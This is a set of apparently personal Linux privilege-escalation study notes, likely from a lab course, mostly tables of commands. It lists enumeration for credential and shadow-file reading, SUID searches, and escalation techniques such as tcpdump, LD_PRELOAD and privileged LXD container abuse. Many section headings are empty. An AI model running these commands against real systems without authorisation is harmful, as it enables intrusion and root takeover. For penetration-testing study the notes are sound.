# Information Gathering

## Environment Enumeration

**Helper Scripts**

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | [LinEnum](https://github.com/rebootuser/LinEnum) | [Lynis](https://github.com/CISOfy/lynis)

| **Command**                                                              | **Description**                                                 |
| ------------------------------------------------------------------------ | --------------------------------------------------------------- |
| `whoami`                                                                 | Describes current user                                          |
| `id`                                                                     | Describes the groups that the current user belongs to           |
| `hostname`                                                               | What the is server named                                        |
| `ifconfig or ip -a`                                                      | What subnet the server is in                                    |
| `sudo -l`                                                                | can the user run anything with sudo                             |
| `cat /etc/os-release`                                                    | Check OS and version                                            |
| `echo $PATH`                                                             | Check the current users path                                    |
| `env`                                                                    | Check all environment variables for user                        |
| `uname -a`                                                               | Check the Kernel version                                        |
| `lscpu`                                                                  | Information about the host itself such as the CPU type/version  |
| `cat /etc/shells`                                                        | What login shells exist on the server                           |
| `lsblk`                                                                  | Look at the drives and any shares on the system                 |
| `lpstat`                                                                 | Find information about any printers attached to the system      |
| `cat /etc/fstab`                                                         | Check for mounted drive creds by grepping for username/password |
| `route or netstat -rn`                                                   | Check routing table                                             |
| `/etc/resolv.conf`                                                       | Useful for domain joined servers                                |
| `arp -a`                                                                 | Check the ARP table for other hosts                             |
| `cat /etc/passwd`                                                        | Find info about users on the system                             |
| `cat /etc/shadow`                                                        | Login info for users (unlikely to be readable without root)     |
| `cat /etc/group`                                                         | Find information about the system groups (and users)            |
| `getent group sudo`                                                      | Query group file for interesting groups/users                   |
| `ls -lisa /home`                                                         | ALWAYS check the home directory for current user and others     |
| `df -h`                                                                  | General information about the linux distro                      |
| `cat /etc/fstab \| grep -v "#" \| column -t`                             | Find unmounted file systems                                     |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep <USER>` | Find all hidden user files                                      |
| `find / -type d -name ".*" -ls 2>/dev/null`                              | Find all hidden directories                                     |
| `ls -lisa /tmp /var/tmp /dev/shm`                                        | Check tmp folders for scripts or other loot                     |

## Linux Services & Internals Enumeration

| **Command**                                                                                                | **Description**                                                           |
| ---------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ---------------------------------- |
| `cat /etc/hosts`                                                                                           | Describes current users hosts file                                        |
| `lastlog`                                                                                                  | Find the last login time for user                                         |
| `who or finger`                                                                                            | Check if anyone is on the system at the same time                         |
| `history`                                                                                                  | Check the users command history                                           |
| `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                       | Find any special history files created by scripts/programs                |
| `ls -la /etc/cron.daily/`                                                                                  | Show all daily cron jobs on the system                                    |
| `find /proc -name cmdline -exec cat {} \; 2>/dev/null\| tr " " "\n"`                                       | Find information from proc/procfs file system on processes, hardware, etc |
| `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list` | List of installed packages                                                |
| `sudo -V`                                                                                                  | Check the sudo version for known exploits                                 |
| `ls -l /bin /usr/bin/ /usr/sbin/`                                                                          | Look for compiled binaries installed on system                            |
| `ps aux                                                                                                    | grep root`                                                                | Find services running as root user |
| `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                        | Find all configuration files                                              |

| `strace ping -c1 <IP ADDR>` | Linix diagnostic tool to track and analyze system calls and signal processing |

## Credentials Hunting

| `for i in $(curl -s https://gtfobins.github.io/ \| html2text \| cut -d" " -f1 \| sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done` | Bash one-liner that will compare installed binaries to GTFObins to investigate later |

| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\\\|snap\\\|share"` | Find all scripts on system |

# Environment-based Privilege Escalation

## Path Abuse

## Wildcard Abuse

## Escaping Restricted Shells

# Permissions-based Privilege Escalation

## Special Permissions

## Sudo Rights Abuse

## Privileged Groups

## Capabilities

# Service-based Privilege Escalation

## Vulnerable Services

## Cron Job Abuse

## Containers

## Logrotate

## Misc Techniques

# Linux Internals-based Privilege Escalation

## Kernel Exploits

## Shared Libraries

## Shared Object Hijacking

## Python Library Hijacking

# Recent 0-Days (as of 6-16-23)

## Sudo

## Polkit

## Dirty Pipe

## Netfilter

| **Command**                                                                         | **Description**                                       |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
| Â `ps aux \| grep root`                                                              | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release `                                                             | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll  \| grep PATH`                                                  | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |
